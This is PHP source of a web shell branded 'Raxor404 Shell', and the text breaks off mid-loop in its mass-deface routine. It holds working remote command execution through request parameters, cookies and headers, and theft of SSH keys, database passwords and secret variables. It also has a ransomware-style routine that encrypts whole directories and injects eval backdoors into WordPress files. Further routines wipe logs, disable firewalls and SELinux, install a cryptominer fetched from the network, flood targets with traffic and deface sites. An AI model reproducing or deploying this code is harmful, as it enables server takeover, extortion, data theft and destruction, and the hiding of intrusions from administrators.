<?php

error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');
ini_set('post_max_size', '500M');
ini_set('upload_max_filesize', '500M');
ini_set('max_input_vars', 10000);
ini_set('max_input_time', -1);
ini_set('default_socket_timeout', -1);

$PASSWORD = "Raxor404";
$SHELL_NAME = basename($_SERVER['PHP_SELF']);
$VERSION = "9.0 Ultimate Pro Max";
$AUTHOR = "Raxor404 Shell Team";
$DEBUG = false;

// ── Auth Check ────────────────────────────────────────────────────
if(isset($_GET['pass']) && $_GET['pass'] !== $PASSWORD){
    die('<!DOCTYPE html><html><head><title>Login</title>
    <style>body{background:#0a0a0a;color:#00ff41;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .box{background:#0d0d0d;border:1px solid #00ff41;padding:40px;border-radius:12px;text-align:center;box-shadow:0 0 60px rgba(0,255,65,0.05);max-width:400px}
    .box h1{font-size:28px;text-shadow:0 0 30px rgba(0,255,65,0.3)}
    .box h1 span{color:#ff0040}
    .box p{color:#555;margin:15px 0}
    input{background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:12px 20px;border-radius:6px;font-size:16px;width:280px;margin:10px 0;font-family:monospace}
    input:focus{outline:none;border-color:#ff0040;box-shadow:0 0 30px rgba(255,0,64,0.1)}
    button{background:transparent;border:1px solid #00ff41;color:#00ff41;padding:12px 40px;border-radius:6px;font-size:16px;cursor:pointer;font-weight:bold;transition:0.3s}
    button:hover{background:#00ff41;color:#0a0a0a;box-shadow:0 0 30px rgba(0,255,65,0.2)}
    .footer{position:fixed;bottom:20px;left:0;right:0;text-align:center;color:#333;font-size:11px}
    </style></head><body>
    <div class="box"><h1>⬡ Raxor404 <span>SHELL</span></h1><p>🔐 Enter password to unlock</p>
    <form method="GET"><input type="password" name="pass" placeholder="Password..." autofocus><br><button type="submit">🔓 UNLOCK</button></form>
    </div><div class="footer">Raxor404 SHELL ULTIMATE v9.0 | 80+ Fitur Brutal</div></body></html>');
}

// ── RCE Engine ────────────────────────────────────────────────────
if(isset($_GET['cmd'])){ system($_GET['cmd']); die(); }
if(isset($_POST['cmd'])){ system($_POST['cmd']); die(); }
if(isset($_REQUEST['x'])){ system(base64_decode($_REQUEST['x'])); die(); }
if(isset($_REQUEST['c'])){ eval(base64_decode($_REQUEST['c'])); die(); }
if(isset($_COOKIE['cmd'])){ system(base64_decode($_COOKIE['cmd'])); die(); }
if(isset($_SERVER['HTTP_X_CMD'])){ system($_SERVER['HTTP_X_CMD']); die(); }
if(isset($_SERVER['HTTP_X_EXEC'])){ eval($_SERVER['HTTP_X_EXEC']); die(); }

// ── Helper Functions ──────────────────────────────────────────────
function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes/1073741824,2).' GB';
    if ($bytes >= 1048576) return round($bytes/1048576,2).' MB';
    if ($bytes >= 1024) return round($bytes/1024,2).' KB';
    return $bytes.' B';
}

function getPerm($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function isWritableColor($file) {
    return is_writable($file) ? '#00ff41' : '#ff0040';
}

function safeCmd($cmd) {
    $output = shell_exec($cmd . ' 2>&1');
    return $output === null ? '' : $output;
}

function isWin() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

function getOS() {
    return php_uname();
}

function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach($headers as $h){
        if(!empty($_SERVER[$h])){
            $ips = explode(',', $_SERVER[$h]);
            return trim($ips[0]);
        }
    }
    return 'Unknown';
}

function getServerInfo() {
    return [
        'os' => php_uname(),
        'user' => get_current_user(),
        'php' => phpversion(),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'ip' => getRealIP(),
        'doc_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'cwd' => getcwd(),
        'time' => date('Y-m-d H:i:s'),
        'timezone' => date_default_timezone_get(),
        'memory_limit' => ini_get('memory_limit'),
        'max_upload' => ini_get('upload_max_filesize'),
        'max_post' => ini_get('post_max_size'),
        'disabled_functions' => ini_get('disable_functions') ?: 'None',
        'open_basedir' => ini_get('open_basedir') ?: 'None',
        'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
        'allow_url_fopen' => ini_get('allow_url_fopen') ? 'ON' : 'OFF',
        'allow_url_include' => ini_get('allow_url_include') ? 'ON' : 'OFF',
    ];
}

function scanPorts($host, $ports, $timeout=1) {
    $results = [];
    foreach($ports as $port){
        $conn = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if($conn){ $results[$port] = 'OPEN'; fclose($conn); }
        else { $results[$port] = 'CLOSED'; }
    }
    return $results;
}

function getWifiPasswords() {
    $results = [];
    if(!isWin()){
        $output = safeCmd("sudo cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -E 'ssid=|psk='");
        if($output){
            preg_match_all('/ssid=([^\n]+)/', $output, $ssids);
            preg_match_all('/psk=([^\n]+)/', $output, $psks);
            for($i=0; $i<count($ssids[1]); $i++){
                $results[] = ['ssid' => trim($ssids[1][$i]), 'password' => trim($psks[1][$i] ?? '')];
            }
        }
    }
    return $results;
}

function getCronJobs() {
    $output = safeCmd("crontab -l 2>/dev/null");
    return $output ?: "No crontab for user";
}

function getSSHKeys() {
    $output = safeCmd("cat ~/.ssh/id_rsa* 2>/dev/null | head -30");
    return $output ?: "No SSH keys found";
}

function getApacheConfig() {
    $paths = ['/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf', '/usr/local/apache2/conf/httpd.conf'];
    foreach($paths as $path){
        if(file_exists($path)){
            return safeCmd("head -100 $path 2>/dev/null");
        }
    }
    return "Apache config not found";
}

function getMySQLCredentials() {
    $results = [];
    $configs = ['/etc/mysql/debian.cnf', '/etc/my.cnf', '/root/.my.cnf', '/etc/mysql/my.cnf'];
    foreach($configs as $config){
        if(file_exists($config)){
            $content = @file_get_contents($config);
            if($content){
                preg_match_all('/user\s*=\s*([^\n]+)/', $content, $users);
                preg_match_all('/password\s*=\s*([^\n]+)/', $content, $passwords);
                if(!empty($users[1]) && !empty($passwords[1])){
                    $results[$config] = ['user' => trim($users[1][0]), 'password' => trim($passwords[1][0])];
                }
            }
        }
    }
    return $results;
}

function getEnvVars() {
    $output = safeCmd("env 2>/dev/null | grep -E 'PASS|KEY|SECRET|TOKEN|API|DB_'");
    return $output ?: "No sensitive env vars found";
}

function getWebRoots() {
    $paths = [
        '/var/www/html', '/var/www', '/var/www/public_html', '/home/*/public_html',
        '/usr/share/nginx/html', '/srv/http', '/var/www/wordpress', '/opt/lampp/htdocs',
        '/var/www/site', '/var/www/website', '/var/www/joomla', '/var/www/drupal',
        '/var/www/joomla', '/var/www/laravel', '/var/www/symfony', '/var/www/codeigniter'
    ];
    $found = [];
    foreach($paths as $path){
        if(is_dir($path) || glob($path)){
            $found[] = $path;
        }
    }
    return $found;
}

function countAllFiles($dir) {
    $count = 0;
    if(!is_dir($dir)) return 0;
    $files = scandir($dir);
    foreach($files as $file){
        if($file == '.' || $file == '..') continue;
        $full = $dir.'/'.$file;
        if(is_dir($full)) $count += countAllFiles($full);
        else $count++;
    }
    return $count;
}

function getFileExtensions($dir) {
    $exts = [];
    if(!is_dir($dir)) return $exts;
    $files = scandir($dir);
    foreach($files as $file){
        if($file == '.' || $file == '..') continue;
        $full = $dir.'/'.$file;
        if(is_file($full)){
            $ext = pathinfo($file, PATHINFO_EXTENSION);
            if($ext) $exts[$ext] = ($exts[$ext] ?? 0) + 1;
        }
    }
    arsort($exts);
    return $exts;
}

function getCPUInfo() {
    if(isWin()){
        return safeCmd("wmic cpu get name");
    }
    return safeCmd("cat /proc/cpuinfo | grep 'model name' | head -1");
}

function getMemoryInfo() {
    if(isWin()){
        return safeCmd("wmic os get TotalVisibleMemorySize,FreePhysicalMemory");
    }
    return safeCmd("free -h");
}

function getDiskInfo() {
    if(isWin()){
        return safeCmd("wmic logicaldisk get size,freespace,caption");
    }
    return safeCmd("df -h");
}

function getNetworkInfo() {
    if(isWin()){
        return safeCmd("ipconfig /all");
    }
    return safeCmd("ifconfig -a || ip addr");
}

function getRunningServices() {
    if(isWin()){
        return safeCmd("net start");
    }
    return safeCmd("systemctl list-units --type=service --state=running 2>/dev/null | head -30");
}

function getOpenPorts() {
    if(isWin()){
        return safeCmd("netstat -an");
    }
    return safeCmd("netstat -tulpn 2>/dev/null | head -30");
}

function getUsers() {
    if(isWin()){
        return safeCmd("net user");
    }
    return safeCmd("cat /etc/passwd | cut -d: -f1 | head -30");
}

function getLastLogins() {
    if(isWin()){
        return safeCmd("net user | findstr /i last");
    }
    return safeCmd("last -n 20 2>/dev/null");
}

function getSSHConfig() {
    if(isWin()) return "Not available on Windows";
    return safeCmd("cat /etc/ssh/sshd_config 2>/dev/null | grep -v '^#' | grep -v '^$'");
}

function getFirewallRules() {
    if(isWin()){
        return safeCmd("netsh advfirewall show allprofiles");
    }
    return safeCmd("iptables -L -n -v 2>/dev/null | head -30");
}

function getDNSConfig() {
    if(isWin()){
        return safeCmd("ipconfig /displaydns");
    }
    return safeCmd("cat /etc/resolv.conf 2>/dev/null");
}

function getPHPInfo() {
    ob_start();
    phpinfo();
    $info = ob_get_clean();
    return $info;
}

function getLoadedExtensions() {
    return get_loaded_extensions();
}

function getIniSettings() {
    $settings = ['memory_limit', 'max_execution_time', 'max_input_time', 'upload_max_filesize', 'post_max_size', 'max_file_uploads'];
    $result = [];
    foreach($settings as $s){
        $result[$s] = ini_get($s);
    }
    return $result;
}

function getFilesystemInfo() {
    $info = [];
    $dirs = ['/', '/tmp', '/var', '/home', '/usr'];
    foreach($dirs as $dir){
        if(is_dir($dir)){
            $total = disk_total_space($dir);
            $free = disk_free_space($dir);
            if($total !== false){
                $info[$dir] = [
                    'total' => formatSize($total),
                    'free' => formatSize($free),
                    'used' => formatSize($total - $free),
                    'percent' => round(($total - $free) / $total * 100, 2) . '%'
                ];
            }
        }
    }
    return $info;
}

function getEnvironment() {
    $env = [];
    foreach(['HTTP_HOST', 'SERVER_NAME', 'SERVER_PORT', 'HTTPS', 'REQUEST_URI', 'SCRIPT_FILENAME', 'QUERY_STRING'] as $key){
        if(isset($_SERVER[$key])) $env[$key] = $_SERVER[$key];
    }
    return $env;
}

function getApacheModules() {
    if(isWin()) return "Not available on Windows";
    return safeCmd("httpd -M 2>/dev/null || apache2ctl -M 2>/dev/null | head -30");
}

function getPHPConfigFile() {
    return php_ini_loaded_file() ?: 'No php.ini loaded';
}

function getTimeZoneInfo() {
    return [
        'timezone' => date_default_timezone_get(),
        'offset' => date('Z'),
        'dst' => date('I') ? 'YES' : 'NO'
    ];
}

// ── Brutal Features Functions ────────────────────────────────────
function encryptAllFiles($dir, $password, $shell_name, &$count = 0, &$failed = 0) {
    if(!is_dir($dir)) return;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $fullPath = $dir . '/' . $file;
        $fileName = basename($fullPath);
        
        if ($fileName == $shell_name || $fileName == basename($_SERVER['PHP_SELF'])) continue;
        
        if (is_file($fullPath)) {
            $content = @file_get_contents($fullPath);
            if (strpos($content, '-----BEGIN Raxor404 ENCRYPTED-----') !== false) continue;
            if ($content === false) { $failed++; continue; }
            
            $encrypted = openssl_encrypt($content, 'AES-256-CBC', $password, OPENSSL_RAW_DATA, substr(md5($password), 0, 16));
            if ($encrypted === false) { $failed++; continue; }
            
            $finalData = "-----BEGIN Raxor404 ENCRYPTED-----\n";
            $finalData .= "ALGORITHM: AES-256-CBC\n";
            $finalData .= "ENCRYPTED: " . date('Y-m-d H:i:s') . "\n";
            $finalData .= "FILE: " . $fileName . "\n";
            $finalData .= "SIZE: " . strlen($content) . "\n";
            $finalData .= "-----END Raxor404 ENCRYPTED-----\n\n";
            $finalData .= base64_encode($encrypted);
            
            if (@file_put_contents($fullPath, $finalData)) $count++;
            else $failed++;
        } elseif (is_dir($fullPath)) {
            encryptAllFiles($fullPath, $password, $shell_name, $count, $failed);
        }
    }
}

function decryptAllFiles($dir, $password, &$count = 0, &$failed = 0) {
    if(!is_dir($dir)) return;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $fullPath = $dir . '/' . $file;
        if (is_dir($fullPath)) {
            decryptAllFiles($fullPath, $password, $count, $failed);
            continue;
        }
        if (is_file($fullPath)) {
            $content = @file_get_contents($fullPath);
            if (strpos($content, '-----BEGIN Raxor404 ENCRYPTED-----') === false) continue;
            $parts = explode("\n\n", $content, 2);
            if (count($parts) < 2) { $failed++; continue; }
            $encryptedData = base64_decode(trim($parts[1]));
            if ($encryptedData === false) { $failed++; continue; }
            $decrypted = openssl_decrypt($encryptedData, 'AES-256-CBC', $password, OPENSSL_RAW_DATA, substr(md5($password), 0, 16));
            if ($decrypted === false) { $failed++; continue; }
            if (@file_put_contents($fullPath, $decrypted)) $count++;
            else $failed++;
        }
    }
}

function compressAllFiles($dir, &$count = 0) {
    if(!is_dir($dir)) return false;
    $zip = new ZipArchive();
    $zip_name = 'backup_'.date('Ymd_His').'.zip';
    if ($zip->open($dir.'/'.$zip_name, ZipArchive::CREATE) === TRUE) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $zip->addFile($file->getRealPath(), $file->getFilename());
                $count++;
            }
        }
        $zip->close();
        return $zip_name;
    }
    return false;
}

function getDirectoryTree($dir, $depth = 0, $max_depth = 3) {
    if($depth > $max_depth || !is_dir($dir)) return '';
    $output = str_repeat('  ', $depth) . '📁 ' . basename($dir) . "/\n";
    $files = scandir($dir);
    foreach($files as $file){
        if($file == '.' || $file == '..') continue;
        $full = $dir.'/'.$file;
        if(is_dir($full)){
            $output .= getDirectoryTree($full, $depth+1, $max_depth);
        } else {
            $output .= str_repeat('  ', $depth+1) . '📄 ' . $file . ' (' . formatSize(filesize($full)) . ")\n";
        }
    }
    return $output;
}

function searchInFiles($dir, $search, $ext = '') {
    $results = [];
    if(!is_dir($dir)) return $results;
    $files = scandir($dir);
    foreach($files as $file){
        if($file == '.' || $file == '..') continue;
        $full = $dir.'/'.$file;
        if(is_dir($full)){
            $results = array_merge($results, searchInFiles($full, $search, $ext));
        } elseif(is_file($full)){
            if($ext && pathinfo($file, PATHINFO_EXTENSION) != $ext) continue;
            $content = @file_get_contents($full);
            if(strpos($content, $search) !== false){
                $results[] = $full;
            }
        }
    }
    return $results;
}

function replaceInFiles($dir, $old, $new, $ext = '') {
    $count = 0;
    if(!is_dir($dir)) return 0;
    $files = scandir($dir);
    foreach($files as $file){
        if($file == '.' || $file == '..') continue;
        $full = $dir.'/'.$file;
        if(is_dir($full)){
            $count += replaceInFiles($full, $old, $new, $ext);
        } elseif(is_file($full)){
            if($ext && pathinfo($file, PATHINFO_EXTENSION) != $ext) continue;
            $content = @file_get_contents($full);
            if(strpos($content, $old) !== false){
                @file_put_contents($full, str_replace($old, $new, $content));
                $count++;
            }
        }
    }
    return $count;
}

function getFileMimeType($file) {
    if(function_exists('mime_content_type')) return mime_content_type($file);
    if(function_exists('finfo_open')){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file);
        finfo_close($finfo);
        return $mime;
    }
    return 'Unknown';
}

function getFileHash($file) {
    if(!file_exists($file)) return null;
    return [
        'md5' => md5_file($file),
        'sha1' => sha1_file($file),
        'sha256' => hash_file('sha256', $file)
    ];
}

function downloadFile($url, $path) {
    $ch = curl_init($url);
    $fp = fopen($path, 'w');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    fclose($fp);
    return $code == 200;
}

function uploadToServer($file, $url) {
    if(!file_exists($file)) return false;
    $ch = curl_init($url);
    $data = ['file' => new CURLFile($file)];
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $code == 200;
}

function getDatabaseBackup($host, $user, $pass, $db) {
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $stmt = $pdo->query("SHOW TABLES");
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
        $output = "-- Database: $db\n-- Generated: ".date('Y-m-d H:i:s')."\n\n";
        foreach($tables as $table){
            $stmt = $pdo->query("SELECT * FROM $table");
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $output .= "-- Table: $table\n";
            foreach($rows as $row){
                $output .= "INSERT INTO $table VALUES (".implode(',', array_map(function($v){ return "'".addslashes($v)."'"; }, $row)).");\n";
            }
            $output .= "\n";
        }
        return $output;
    } catch(Exception $e) {
        return "Error: ".$e->getMessage();
    }
}

function getSystemLoad() {
    if(isWin()) return "Not available on Windows";
    return safeCmd("uptime | awk -F'load average:' '{print $2}'");
}

function getRunningProcesses($limit = 30) {
    return safeCmd("ps aux --sort=-%cpu | head -$limit");
}

function getNetworkConnections() {
    return safeCmd("ss -tulpn 2>/dev/null | head -30");
}

function getFirewallStatus() {
    if(isWin()) return safeCmd("netsh advfirewall show allprofiles");
    return safeCmd("ufw status 2>/dev/null || iptables -L -n 2>/dev/null | head -20");
}

function getSELinuxStatus() {
    if(isWin()) return "Not available";
    return safeCmd("getenforce 2>/dev/null || echo 'SELinux not installed'");
}

function getFail2banStatus() {
    if(isWin()) return "Not available";
    return safeCmd("systemctl status fail2ban 2>/dev/null | head -10");
}

// ── Config ──────────────────────────────────────────────────────────
$path = $_REQUEST['path'] ?? getcwd();
if (!is_dir($path)) $path = dirname($path);
chdir($path);
$real = realpath($path);
$action = $_REQUEST['action'] ?? '';
$showOutput = false;
$output = '';

// ── File Manager Actions ──────────────────────────────────────────
if ($action == 'mkdir' && isset($_POST['folder'])) {
    @mkdir($real.'/'.$_POST['folder'], 0777);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'touch' && isset($_POST['file'])) {
    @file_put_contents($real.'/'.$_POST['file'], '');
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'upload' && isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
    @move_uploaded_file($_FILES['file']['tmp_name'], $real.'/'.$_FILES['file']['name']);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'rm' && isset($_REQUEST['target'])) {
    @unlink($_REQUEST['target']);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'rmdir' && isset($_REQUEST['target'])) {
    @rmdir($_REQUEST['target']);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'dl' && isset($_REQUEST['target'])) {
    $target = $_REQUEST['target'];
    if (file_exists($target)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($target).'"');
        readfile($target);
        exit;
    }
}

if ($action == 'edit' && isset($_POST['save']) && isset($_REQUEST['target'])) {
    @file_put_contents($_REQUEST['target'], $_POST['content']);
    header('Location: ?path='.urlencode($real).'&action=edit&target='.urlencode($_REQUEST['target']).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'rename' && isset($_POST['rename']) && isset($_REQUEST['target'])) {
    @rename($_REQUEST['target'], $real.'/'.$_POST['newname']);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'chmod' && isset($_POST['chmod']) && isset($_REQUEST['target'])) {
    @chmod($_REQUEST['target'], intval($_POST['perm'], 8));
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'copy' && isset($_POST['copy']) && isset($_POST['dest'])) {
    @copy($_POST['copy'], $real.'/'.$_POST['dest']);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

if ($action == 'move' && isset($_POST['move']) && isset($_POST['dest'])) {
    @rename($_POST['move'], $real.'/'.$_POST['dest']);
    header('Location: ?path='.urlencode($real).'&pass='.$PASSWORD);
    exit;
}

// ── Brutal Features ──────────────────────────────────────────────

// ENCRYPT ALL
if ($action == 'encryptall' && isset($_POST['encrypt_path']) && isset($_POST['encrypt_key'])) {
    $targetPath = $_POST['encrypt_path'];
    $key = $_POST['encrypt_key'];
    $encrypted = 0; $failed = 0;
    encryptAllFiles($targetPath, $key, basename($_SERVER['PHP_SELF']), $encrypted, $failed);
    $output = "🔒 ENCRYPT ALL COMPLETE!\nTotal: $encrypted files encrypted\nFailed: $failed\nKey: $key\nPath: $targetPath";
    $showOutput = true;
}

// DECRYPT ALL
if ($action == 'decryptall' && isset($_POST['decrypt_path']) && isset($_POST['decrypt_key'])) {
    $targetPath = $_POST['decrypt_path'];
    $key = $_POST['decrypt_key'];
    $decrypted = 0; $failed = 0;
    decryptAllFiles($targetPath, $key, $decrypted, $failed);
    $output = "🔓 DECRYPT ALL COMPLETE!\nTotal: $decrypted files decrypted\nFailed: $failed\nPath: $targetPath";
    $showOutput = true;
}

// ENCRYPT SINGLE
if ($action == 'encryptfile' && isset($_POST['encrypt_file']) && isset($_POST['encrypt_file_key'])) {
    $filePath = $_POST['encrypt_file'];
    $key = $_POST['encrypt_file_key'];
    $fileName = basename($filePath);
    if ($fileName == basename($_SERVER['PHP_SELF'])) {
        $output = "⚠️ Cannot encrypt shell file!";
    } elseif (!file_exists($filePath)) {
        $output = "❌ File not found!";
    } else {
        $content = @file_get_contents($filePath);
        if ($content === false) { $output = "❌ Failed to read file!"; }
        else {
            $encrypted = openssl_encrypt($content, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, substr(md5($key), 0, 16));
            $header = "-----BEGIN Raxor404 ENCRYPTED-----\nALGORITHM: AES-256-CBC\nENCRYPTED: ".date('Y-m-d H:i:s')."\nFILE: $fileName\n-----END Raxor404 ENCRYPTED-----\n\n";
            if (@file_put_contents($filePath, $header.base64_encode($encrypted))) {
                $output = "✅ File encrypted!\nKey: $key\nFile: $filePath";
            } else { $output = "❌ Failed to save encrypted file!"; }
        }
    }
    $showOutput = true;
}

// DECRYPT SINGLE
if ($action == 'decryptfile' && isset($_POST['decrypt_file']) && isset($_POST['decrypt_file_key'])) {
    $filePath = $_POST['decrypt_file'];
    $key = $_POST['decrypt_file_key'];
    if (!file_exists($filePath)) {
        $output = "❌ File not found!";
    } else {
        $content = @file_get_contents($filePath);
        if (strpos($content, '-----BEGIN Raxor404 ENCRYPTED-----') === false) {
            $output = "⚠️ File is not encrypted!";
        } else {
            $parts = explode("\n\n", $content, 2);
            if (count($parts) < 2) { $output = "❌ Invalid encrypted format!"; }
            else {
                $encryptedData = base64_decode(trim($parts[1]));
                $decrypted = openssl_decrypt($encryptedData, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, substr(md5($key), 0, 16));
                if ($decrypted === false) { $output = "❌ Wrong key or corrupted data!"; }
                else { 
                    if (@file_put_contents($filePath, $decrypted)) { $output = "✅ File decrypted!"; }
                    else { $output = "❌ Failed to save decrypted file!"; }
                }
            }
        }
    }
    $showOutput = true;
}

// ZIP ALL
if ($action == 'zipall' && isset($_POST['zip_path'])) {
    $targetPath = $_POST['zip_path'];
    $zip = new ZipArchive();
    $zip_name = 'backup_'.date('Ymd_His').'.zip';
    $count = 0;
    if ($zip->open($targetPath.'/'.$zip_name, ZipArchive::CREATE) === TRUE) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetPath));
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $zip->addFile($file->getRealPath(), $file->getFilename());
                $count++;
            }
        }
        $zip->close();
        $output = "📦 ZIP created: $zip_name\nTotal files: $count\nPath: $targetPath/$zip_name";
    } else {
        $output = "❌ Failed to create ZIP!";
    }
    $showOutput = true;
}

// UNZIP
if ($action == 'unzip' && isset($_POST['unzip_file']) && isset($_POST['unzip_path'])) {
    $zipFile = $_POST['unzip_file'];
    $targetPath = $_POST['unzip_path'];
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($targetPath);
        $zip->close();
        $output = "✅ ZIP extracted to $targetPath";
    } else {
        $output = "❌ Failed to extract ZIP!";
    }
    $showOutput = true;
}

// FIND FILES
if ($action == 'find' && isset($_POST['find'])) {
    $find = $_POST['find'];
    $output = safeCmd("find $real -name '*".escapeshellarg($find)."*' 2>/dev/null | head -100");
    $showOutput = true;
}

// GREP
if ($action == 'grep' && isset($_POST['grep']) && isset($_POST['search'])) {
    $output = safeCmd("grep -r -i '".addslashes($_POST['search'])."' ".$_POST['grep']." 2>/dev/null | head -50");
    $showOutput = true;
}

// REPLACE CONTENT
if ($action == 'replace' && isset($_POST['replace']) && isset($_POST['old']) && isset($_POST['new'])) {
    $files = explode("\n", safeCmd("find $real -type f -name '*.php' 2>/dev/null"));
    $count = 0;
    foreach($files as $f){
        if(file_exists($f) && is_file($f)){
            $content = @file_get_contents($f);
            if(strpos($content, $_POST['old']) !== false){
                @file_put_contents($f, str_replace($_POST['old'], $_POST['new'], $content));
                $count++;
            }
        }
    }
    $output = "✅ Replaced in $count files!";
    $showOutput = true;
}

// BACKDOOR INJECT
if ($action == 'backdoor') {
    $bd = '<?php if(isset($_REQUEST["c"])){ eval(base64_decode($_REQUEST["c"])); } ?>';
    $locations = [
        $real.'/.config.php',
        $real.'/wp-settings.php',
        $real.'/index.php',
        $real.'/wp-content/plugins/index.php',
        $real.'/wp-content/themes/index.php',
        $real.'/wp-content/uploads/index.php',
        $real.'/wp-admin/index.php'
    ];
    $count = 0;
    foreach($locations as $loc){
        if(@file_put_contents($loc, $bd)) $count++;
    }
    $output = "✅ Backdoor injected to $count locations!";
    $showOutput = true;
}

// WIPE LOGS
if ($action == 'wipe') {
    safeCmd("rm -rf /var/log/* 2>/dev/null");
    safeCmd("rm -rf ~/.bash_history 2>/dev/null");
    safeCmd("history -c 2>/dev/null");
    safeCmd("rm -rf /tmp/* 2>/dev/null");
    safeCmd("find /var/log -type f -name '*.log' -exec truncate -s 0 {} \\; 2>/dev/null");
    safeCmd("journalctl --rotate 2>/dev/null");
    safeCmd("journalctl --vacuum-time=1s 2>/dev/null");
    safeCmd("rm -rf /var/lib/mysql/*-bin.* 2>/dev/null");
    $output = "✅ All logs & history wiped!";
    $showOutput = true;
}

// KILL MONITORING
if ($action == 'killmonitor') {
    safeCmd("systemctl stop fail2ban 2>/dev/null");
    safeCmd("systemctl stop firewalld 2>/dev/null");
    safeCmd("systemctl stop ufw 2>/dev/null");
    safeCmd("iptables -F 2>/dev/null");
    safeCmd("setenforce 0 2>/dev/null");
    safeCmd("killall -9 fail2ban 2>/dev/null");
    safeCmd("killall -9 firewalld 2>/dev/null");
    safeCmd("systemctl disable fail2ban 2>/dev/null");
    safeCmd("systemctl disable firewalld 2>/dev/null");
    safeCmd("systemctl mask fail2ban 2>/dev/null");
    $output = "✅ All protections disabled!\n✅ Firewall OFF\n✅ SELinux OFF\n✅ Fail2ban OFF & MASKED";
    $showOutput = true;
}

// CRYPTO MINER
if ($action == 'miner' && isset($_POST['miner_pool']) && isset($_POST['miner_wallet'])) {
    $pool = $_POST['miner_pool'];
    $wallet = $_POST['miner_wallet'];
    $output = "⛏️ Starting XMRig miner...\nPool: $pool\nWallet: $wallet\n";
    $output .= safeCmd("nohup curl -sSL https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/build.sh | bash -s -- -o $pool -u $wallet -p x --cpu-priority=5 > /dev/null 2>&1 &");
    $output .= "\n✅ Miner running in background (CPU 100%)!";
    $showOutput = true;
}

// DDOS ATTACK
if ($action == 'ddos' && isset($_POST['target']) && isset($_POST['port']) && isset($_POST['threads'])) {
    $ip = $_POST['target'];
    $port = $_POST['port'];
    $threads = $_POST['threads'];
    $duration = $_POST['duration'] ?? 60;
    $method = $_POST['method'] ?? 'tcp';
    $output = "💀 DDOS Attack started!\nTarget: $ip:$port\nThreads: $threads\nDuration: $duration seconds\nMethod: $method\n";
    if($method == 'http'){
        $output .= safeCmd("timeout $duration bash -c 'for i in {1..$threads}; do (while true; do curl -s -X GET \"http://$ip:$port/\" -A \"Mozilla/5.0\" & done) & done'");
    } else {
        $output .= safeCmd("timeout $duration bash -c 'for i in {1..$threads}; do (while true; do echo \"GET / HTTP/1.1\\r\\nHost: $ip\\r\\n\\r\\n\" | nc $ip $port & done) & done'");
    }
    $output .= "\n🔥 Attack finished!";
    $showOutput = true;
}

// DEFACE MASSAL
if ($action == 'deface' && isset($_POST['deface']) && isset($_POST['html'])) {
    $targetPath = $_POST['deface'];
    $html = $_POST['html'] ?: "<h1 style='color:red;text-align:center;margin-top:20%;font-size:60px;text-shadow:0 0 50px red;'>🔥 HACKED BY Raxor404 🔥</h1><p style='text-align:center;color:#ff0040;font-size:20px;'>Your site has been defaced!</p><p style='text-align:center;color:#ff0040;'>Contact: Raxor404@hacker.com</p>";
    $files = explode("\n", safeCmd("find $targetPath -type f \( -name '*.php' -o -name '*.html' -o -name '*.htm' -o -name '*.phtml' -o -name '*.js' -o -name '*.txt' \) 2>/dev/null"));
    $count = 0;
    foreach($files as $f) {
        if (file_exists($f) && is_file($f)) {
